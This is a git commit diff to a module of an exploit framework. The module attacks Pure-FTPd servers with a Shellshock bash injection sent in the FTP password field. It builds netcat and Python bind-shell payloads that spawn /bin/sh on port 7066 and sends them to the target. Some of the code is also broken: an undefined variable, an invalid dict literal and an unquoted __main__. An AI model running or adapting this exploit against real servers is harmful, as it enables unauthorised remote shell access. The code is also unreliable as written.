a38e280539b0774a88ca0f22e1af12cbdd8c42af
raveneus <raveneus.cwillguy@gmail.com>
2016-05-23 03:31:15 +0000

    Update pureftpd_bash_injection.py

--- framework/modules/linux/pureftpd_bash_injection/pureftpd_bash_injection.py
+++ framework/modules/linux/pureftpd_bash_injection/pureftpd_bash_injection.py
@@ -2,24 +2,26 @@ import os, sys
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
 import core
 class pureftpdBashInjectionMenu(core.Exploit):
-    def generate(self, p)
+    def generate(self, p):
         if self.variables["shell"] == "nc":
             shell = "nc -lp 7066 -e /bin/sh &"
-        elif self.shell[0] == "python":
+        elif self.variables["shell"] == "python":
             shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
+        else:
+            print "*** Shell variable must be 'nc' or 'python'."
+            return
         p = "() { :;}; %s/sh -c %s" % (self.variables["rpath"], shell)
         user = self.rand_text(20)
         return (p, user)
     def deliver(self, p):
-        s = socket(AF_INET, SOCK_STREAM)
-        s.connect((self.host[0], 21))
-        s.recv(1024)
+        s = self.connect()
         s.send("USER " + user)
         s.recv(1024)
-        s.send("PASS " + payload)
+        s.send("PASS " + p)
         s.recv(1024)
+        self.disconnect(s)
 def main():
-  pureftpdbashinjectionmenu = pureftpdBashInjectionMenu()
+  pureftpdbashinjectionmenu = pureftpdBashInjectionMenu("pureftpd_bash_injection", "Linux x86 and x64", "", {"host":"", "rpath":"/bin", "shell"}, {"host":"the IP of the target", "rpath":"the remote path utilities (sh, ps, etc.) are in", "shell":"(nc/python) the type of shell to spawn"})
   pureftpdbashinjectionmenu.cmdloop("pdf-console attack(pureftpd_bash_injection)% ")
 if __name__ == __main__:
   main()
